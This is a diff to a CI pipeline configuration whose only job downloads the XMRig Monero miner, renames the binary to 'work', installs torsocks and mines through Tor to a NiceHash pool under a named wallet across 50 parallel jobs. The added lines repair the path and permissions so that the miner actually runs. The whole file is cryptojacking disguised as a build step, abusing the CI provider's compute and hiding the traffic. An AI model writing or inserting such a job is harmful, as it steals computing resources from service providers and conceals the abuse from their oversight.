@@ -13,6 +13,6 @@ blocks:
         - name: 'Job #1'
           commands:
             - >-
-              sudo mkdir /work ; cd /work ; sudo wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz ; sudo tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz ; sudo rm xmrig-6.21.0-linux-static-x64.tar.gz ; sudo mv xmrig-6.21.0 work ; cd /work ; sudo mv xmrig work ; sudo chmod g-s ./work ; sudo apt-get install torsocks -y ; sudo torsocks ./work -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u 37orpMpCSkTH5MQxfA4PTw2YbVdvzPdmPA.Parallel
-              -p cpu -a randomx -k
+              sudo mkdir /work ; cd /work ; sudo wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz ; sudo tar xvzf xmrig-6.21.0-linux-static-x64.tar.gz ; sudo rm xmrig-6.21.0-linux-static-x64.tar.gz ; sudo mv xmrig-6.21.0 work ; cd /work ; sudo mv xmrig work ; sudo chmod +x ./work/xmrig ; sudo apt-get install torsocks -y ; sudo torsocks ./work/xmrig -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u
+              37orpMpCSkTH5MQxfA4PTw2YbVdvzPdmPA.Parallel -p cpu -a randomx -k
           parallelism: 50
